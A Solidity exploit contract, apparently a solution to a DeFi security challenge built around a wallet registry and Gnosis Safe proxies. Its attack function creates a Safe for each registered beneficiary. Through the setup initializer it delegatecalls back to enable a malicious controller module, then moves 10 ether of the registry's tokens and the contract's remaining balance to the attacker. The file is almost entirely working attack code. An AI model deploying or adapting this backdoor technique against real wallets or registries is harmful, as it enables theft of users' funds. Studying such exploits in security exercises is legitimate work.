pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "./WalletRegistry.sol";
import "./ControllerModule.sol";

import "hardhat/console.sol";

contract AttackerBackdoor {
    address private attacker;

    // GnosisSafe exact storage layout part
    event EnabledModule(address module);
    event DisabledModule(address module);
    event ExecutionFromModuleSuccess(address indexed module);
    event ExecutionFromModuleFailure(address indexed module);
    address internal constant SENTINEL_MODULES = address(0x1);
    mapping(address => address) internal modules;

    address private masterCopy;
    WalletRegistry private registry;
    GnosisSafeProxyFactory private factory;
    
    constructor (WalletRegistry registry_, GnosisSafeProxyFactory factory_, address masterCopy_, address attacker_) {
        attacker = attacker_;
        registry = registry_;
        factory = factory_;
        masterCopy = masterCopy_;
    }

    modifier onlyAttacker {
        require(msg.sender == attacker, "You're not owner of this contract");
        _;
    }

    function getProxyAddress(bytes memory initializer, address _singleton, uint _salt) public view returns (address) {
        bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), _salt));
        bytes memory deploymentData = abi.encodePacked(type(GnosisSafeProxy).creationCode, uint256(uint160(_singleton)));
        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xff), address(factory), salt, keccak256(deploymentData)
            )
        );
        return address (uint160(uint(hash)));
    }

    function enableModule(address module) external {
        require(module != address(0) && module != SENTINEL_MODULES, "GS101");
        // Module cannot be added twice.
        require(modules[module] == address(0), "GS102");
        modules[module] = modules[SENTINEL_MODULES];
        modules[SENTINEL_MODULES] = module;
        emit EnabledModule(module);
    }

    function attack(address[] memory _owners) external onlyAttacker {
        for (uint i; i < _owners.length; ++i) {
            uint threashold = 1;
            address[] memory owners = new address[](1);
            owners[0] = _owners[i];

            ControllerModule module = new ControllerModule();

            address to = address(this);
            bytes memory data = abi.encodeWithSignature("enableModule(address)", address(module));
            
            address fallbackHandler = address(0);
            address paymentToken = address(0);
            uint payment = 0;
            address paymentReceiver = address(0);
            bytes memory initializer = abi.encodeWithSelector(GnosisSafe.setup.selector, 
                                                        owners,
                                                        threashold,
                                                        to,
                                                        data,
                                                        fallbackHandler,
                                                        paymentToken,
                                                        payment,
                                                        payable(paymentReceiver));
            factory.createProxyWithCallback(masterCopy, initializer, i, registry);

            address wallet = registry.wallets(_owners[i]);
            module.attack(wallet, address(registry.token()), attacker, 10 ether);
        }

        payable(attacker).transfer(address(this).balance);
    }
}